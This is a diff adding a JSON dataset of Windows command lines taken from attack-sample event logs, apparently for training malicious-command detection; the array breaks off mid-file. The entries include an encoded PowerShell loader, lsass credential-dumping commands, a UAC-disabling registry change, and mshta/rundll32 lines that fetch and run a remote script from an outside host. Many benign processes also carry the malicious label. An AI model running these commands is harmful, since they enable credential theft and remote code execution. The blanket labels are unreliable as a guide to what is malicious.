@@ -1,0 +1,1814 @@
+[
+  {
+    "command": "C:\\Windows\\Sysmon.exe",
+    "label": 1,
+    "source": "babyshark_mimikatz_powershell.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "C:\\Windows\\system32\\wbem\\unsecapp.exe -Embedding",
+    "label": 1,
+    "source": "babyshark_mimikatz_powershell.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "sysmon  -c sysmonconfig-18-apr-2019.xml",
+    "label": 1,
+    "source": "babyshark_mimikatz_powershell.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "Powershell",
+    "label": 1,
+    "source": "babyshark_mimikatz_powershell.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\whoami.exe\"  /user",
+    "label": 1,
+    "source": "babyshark_mimikatz_powershell.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\eventvwr.msc\"",
+    "label": 1,
+    "source": "babyshark_mimikatz_powershell.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "KeeFarce.exe",
+    "label": 1,
+    "source": "CA_keefarce_keepass_credump.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA==",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\InetSRV\\appcmd.exe\"  list vdir /text:physicalpath",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppools /text:name",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \"ERROR ( message:Configuration error \" /text:processmodel.username",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \"ERROR ( message:Configuration error \" /text:processmodel.password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool /text:processmodel.username",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool /text:processmodel.password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \"Filename: redirection.config\" /text:processmodel.username",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \"Filename: redirection.config\" /text:processmodel.password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \"Line Number: 0\" /text:processmodel.username",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \"Line Number: 0\" /text:processmodel.password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \"Description: Cannot read configuration file due to insufficient permissions\" /text:processmodel.username",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \"Description: Cannot read configuration file due to insufficient permissions\" /text:processmodel.password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \". )\" /text:processmodel.username",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list apppool \". )\" /text:processmodel.password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir /text:vdir.name",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \"ERROR ( message:Configuration error \" /text:userName",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \"ERROR ( message:Configuration error \" /text:password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir /text:userName",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir /text:password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \"Filename: redirection.config\" /text:userName",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \"Filename: redirection.config\" /text:password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \"Line Number: 0\" /text:userName",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \"Line Number: 0\" /text:password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \"Description: Cannot read configuration file due to insufficient permissions\" /text:userName",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \"Description: Cannot read configuration file due to insufficient permissions\" /text:password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \". )\" /text:userName",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"  list vdir \". )\" /text:password",
+    "label": 1,
+    "source": "discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "PPLdump.exe  -v lsass lsass.dmp",
+    "label": 1,
+    "source": "ppl_bypass_ppldump_knowdll_hijack_sysmon_security.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "C:\\Windows\\system32\\services.exe 652 \"lsass.dmp\" a708b1d9-e27b-48bc-8ea7-c56d3a23f99 -v",
+    "label": 1,
+    "source": "ppl_bypass_ppldump_knowdll_hijack_sysmon_security.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s fdPHost",
+    "label": 1,
+    "source": "ppl_bypass_ppldump_knowdll_hijack_sysmon_security.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "Outflank-Dumpert.exe",
+    "label": 1,
+    "source": "sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "rundll32.exe  .\\Outflank-Dumpert-DLL.dll, Dump",
+    "label": 1,
+    "source": "sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "AndrewSpecial.exe",
+    "label": 1,
+    "source": "sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "cscript  c:\\ProgramData\\memdump.vbs notepad.exe",
+    "label": 1,
+    "source": "sysmon_10_1_memdump_comsvcs_minidump.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 4868 C:\\Windows\\System32\\notepad.bin full",
+    "label": 1,
+    "source": "sysmon_10_1_memdump_comsvcs_minidump.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "UI0Detect.exe 220",
+    "label": 1,
+    "source": "sysmon_13_keylogger_directx.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "C:\\Windows\\System32\\slui.exe -Embedding",
+    "label": 1,
+    "source": "sysmon_13_keylogger_directx.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "rdrleakdiag.exe  /p 668 /o C:\\Users\\wanwan\\Desktop /fullmemdmp /snap",
+    "label": 1,
+    "source": "sysmon_rdrleakdiag_lsass_dump.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "C:\\WINDOWS\\system32\\lsass.exe",
+    "label": 1,
+    "source": "sysmon_rdrleakdiag_lsass_dump.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "MalSeclogon.exe  -p 636 -d 2",
+    "label": 1,
+    "source": "tutto_malseclogon.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s seclogon",
+    "label": 1,
+    "source": "tutto_malseclogon.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "MalSeclogon.exe  -p 636 -d 2 -l 1",
+    "label": 1,
+    "source": "tutto_malseclogon.evtx",
+    "folder": "Credential Access"
+  },
+  {
+    "command": "\"C:\\Users\\IEUser\\Desktop\\info.rar\\jjs.exe\"",
+    "label": 1,
+    "source": "apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\svchost.exe",
+    "label": 1,
+    "source": "apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "ppldump.exe  -p lsass.exe -o a.png",
+    "label": 1,
+    "source": "DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\WerFault.exe -u -p 3004 -s 632",
+    "label": 1,
+    "source": "DE_EventLog_Service_Crashed.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\WerFault.exe -u -p 3668 -s 4420",
+    "label": 1,
+    "source": "DE_EventLog_Service_Crashed.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"LogonUI.exe\" /flags:0x4 /state0:0xa3cea855 /state1:0x41c64e6d",
+    "label": 1,
+    "source": "DE_EventLog_Service_Crashed.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"LogonUI.exe\" /flags:0x2 /state0:0xa3bd2855 /state1:0x41c64e6d",
+    "label": 1,
+    "source": "DE_EventLog_Service_Crashed.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "attrib  +h nbtscan.exe",
+    "label": 1,
+    "source": "de_hiding_files_via_attrib_cmdlet.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\cmd.exe\"",
+    "label": 1,
+    "source": "de_portforward_netsh_rdp_sysmon_13_1.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "netsh  I p a v l=8001 listena=1.2.3.4 connectp=3389 c=1.2.3.5",
+    "label": 1,
+    "source": "de_portforward_netsh_rdp_sysmon_13_1.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\".\\samir.exe\"",
+    "label": 1,
+    "source": "DE_ProcessHerpaderping_Sysmon_11_10_1_7.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}",
+    "label": 1,
+    "source": "DE_remote_eventlog_svc_crash_byt3bl33d3r_sysmon_17_1_3.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\DllHost.exe /Processid:{49F6E667-6658-4BD1-9DE9-6AF87F9FAF85}",
+    "label": 1,
+    "source": "DE_remote_eventlog_svc_crash_byt3bl33d3r_sysmon_17_1_3.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\WerFault.exe -u -p 5424 -s 4616",
+    "label": 1,
+    "source": "DE_remote_eventlog_svc_crash_byt3bl33d3r_sysmon_17_1_3.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\wermgr.exe -upload",
+    "label": 1,
+    "source": "DE_remote_eventlog_svc_crash_byt3bl33d3r_sysmon_17_1_3.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "reg  add hklm\\software\\microsoft\\windows\\currentversion\\policies\\system /v EnableLUA /t REG_DWORD /d 0x0 /f",
+    "label": 1,
+    "source": "DE_UAC_Disabled_Sysmon_12_13.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "Furutaka.exe  dummy2.sys",
+    "label": 1,
+    "source": "DSE_bypass_BYOV_TDL_dummydriver_sysmon_6_7_13.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "chost.exe  payload.bin",
+    "label": 1,
+    "source": "evasion_codeinj_odzhan_conhost_sysmon_10_1.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "notepad",
+    "label": 1,
+    "source": "evasion_codeinj_odzhan_conhost_sysmon_10_1.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "spooler.exe  payload.bin",
+    "label": 1,
+    "source": "evasion_codeinj_odzhan_spoolsv_sysmon_10_1.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "whoami",
+    "label": 1,
+    "source": "faxhell_sysmon_7_1_18_3_bindshell_dllhijack.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "calc.exe",
+    "label": 1,
+    "source": "sideloading_wwlib_sysmon_7_1_11.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"C:\\Program Files\\WindowsApps\\Microsoft.WindowsCalculator_10.2008.2.0_x64__8wekyb3d8bbwe\\Calculator.exe\" -ServerName:App.AppXsm3pg4n7er43kdh1qp4e79f1j7am68r8.mca",
+    "label": 1,
+    "source": "sideloading_wwlib_sysmon_7_1_11.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
+    "label": 1,
+    "source": "sideloading_wwlib_sysmon_7_1_11.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "usoclient  StartInteractiveScan",
+    "label": 1,
+    "source": "Sysmon 7  Update Session Orchestrator Dll Hijack.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "rundll32 windowscoredeviceinfo.dll,CreateBackdoor",
+    "label": 1,
+    "source": "Sysmon 7  Update Session Orchestrator Dll Hijack.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "nc.exe  127.0.0.1 1337",
+    "label": 1,
+    "source": "Sysmon 7  Update Session Orchestrator Dll Hijack.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "sc  stop CDPSvc",
+    "label": 1,
+    "source": "Sysmon 7 dllhijack_cdpsshims_CDPSvc.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "sc  query CDPSvc",
+    "label": 1,
+    "source": "Sysmon 7 dllhijack_cdpsshims_CDPSvc.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"C:\\Program Files\\WindowsApps\\Microsoft.MicrosoftOfficeHub_18.2002.1101.0_x64__8wekyb3d8bbwe\\LocalBridge.exe\" /InvokerPRAID: Microsoft.MicrosoftOfficeHub notifications",
+    "label": 1,
+    "source": "Sysmon 7 dllhijack_cdpsshims_CDPSvc.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "net  start CDPSvc",
+    "label": 1,
+    "source": "Sysmon 7 dllhijack_cdpsshims_CDPSvc.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\net1  start CDPSvc",
+    "label": 1,
+    "source": "Sysmon 7 dllhijack_cdpsshims_CDPSvc.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s CDPSvc",
+    "label": 1,
+    "source": "Sysmon 7 dllhijack_cdpsshims_CDPSvc.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc",
+    "label": 1,
+    "source": "sysmon_10_1_ppid_spoofing.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\cmd.exe\" /C \"C:\\Users\\IEUser\\Desktop\\RDPWrap-v1.6.2\\install.bat\"",
+    "label": 1,
+    "source": "sysmon_13_rdp_settings_tampering.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"C:\\Users\\IEUser\\Desktop\\RDPWrap-v1.6.2\\RDPWInst\"  -i -o",
+    "label": 1,
+    "source": "sysmon_13_rdp_settings_tampering.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in protocol=tcp localport=3389 profile=any action=allow",
+    "label": 1,
+    "source": "sysmon_13_rdp_settings_tampering.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "C:\\Windows\\System32\\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {995C996E-D918-4a8c-A302-45719A6F4EA7} -Embedding",
+    "label": 1,
+    "source": "sysmon_13_rdp_settings_tampering.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"C:\\Users\\IEUser\\Desktop\\UniversalTermsrvPatch_20090425\\UniversalTermsrvPatch_20090425\\UniversalTermsrvPatch-x86.exe\"",
+    "label": 1,
+    "source": "sysmon_13_rdp_settings_tampering.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\takeown.exe\" /f  C:\\Windows\\System32\\termsrv.dll",
+    "label": 1,
+    "source": "sysmon_13_rdp_settings_tampering.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\icacls.exe\" C:\\Windows\\System32\\termsrv.dll /grant %%username%%:F",
+    "label": 1,
+    "source": "sysmon_13_rdp_settings_tampering.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\icacls.exe\" C:\\Windows\\System32\\termsrv.dll /grant *S-1-1-0:(F)",
+    "label": 1,
+    "source": "sysmon_13_rdp_settings_tampering.evtx",
+    "folder": "Defense Evasion"
+  },
+  {
+    "command": "c:\\windows\\system32\\cmd.exe",
+    "label": 1,
+    "source": "evasion_execution_imageload_wuauclt_lolbas.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe /nologo /nodemode:1 /nodeReuse:true /low:false",
+    "label": 1,
+    "source": "execution_evasion_visual_studio_prebuild_event.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\windows\\system32\\cmd.exe\"  /Q /D /C C:\\Users\\bouss\\AppData\\Local\\Temp\\tmpf890f11830e143ada2d718f706dd94c0.exec.cmd",
+    "label": 1,
+    "source": "execution_evasion_visual_studio_prebuild_event.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "powershell.exe   start-process notepad.exe",
+    "label": 1,
+    "source": "execution_evasion_visual_studio_prebuild_event.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\windows\\system32\\notepad.exe\"",
+    "label": 1,
+    "source": "execution_evasion_visual_studio_prebuild_event.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\Tracker.exe\" @\"C:\\Users\\bouss\\AppData\\Local\\Temp\\tmp5938b880d43743db91973c95f519f06b.tmp\" /c \"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC\\14.26.28801\\bin\\HostX86\\x86\\CL.exe\"  @\"C:\\Users\\bouss\\AppData\\Local\\Temp\\tmp19546d957b6e4d15b83f93a323d5f087.rsp\"",
+    "label": 1,
+    "source": "execution_evasion_visual_studio_prebuild_event.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC\\14.26.28801\\bin\\HostX86\\x86\\CL.exe\" @C:\\Users\\bouss\\AppData\\Local\\Temp\\tmp19546d957b6e4d15b83f93a323d5f087.rsp",
+    "label": 1,
+    "source": "execution_evasion_visual_studio_prebuild_event.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC\\14.26.28801\\bin\\HostX86\\x86\\VCTIP.EXE\"",
+    "label": 1,
+    "source": "execution_evasion_visual_studio_prebuild_event.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd.exe",
+    "label": 1,
+    "source": "exec_driveby_cve-2018-15982_sysmon_1_10.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "msxsl.exe  c:\\Users\\IEUser\\AppData\\Roaming\\Adobe\\test.dat c:\\Users\\IEUser\\AppData\\Roaming\\Adobe\\test.dat",
+    "label": 1,
+    "source": "exec_msxsl_xsl_sysmon_1_7.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd.exe  /C rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WScript.Shell\").run(\"mshta https://hotelesms.com/talsk.txt\",0,true);",
+    "label": 1,
+    "source": "exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "rundll32.exe  javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WScript.Shell\").run(\"mshta https://hotelesms.com/talsk.txt\",0,true);",
+    "label": 1,
+    "source": "exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\mshta.exe\" https://hotelesms.com/talsk.txt",
+    "label": 1,
+    "source": "exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx",
+    "folder": "Execution"
+  },
+  {
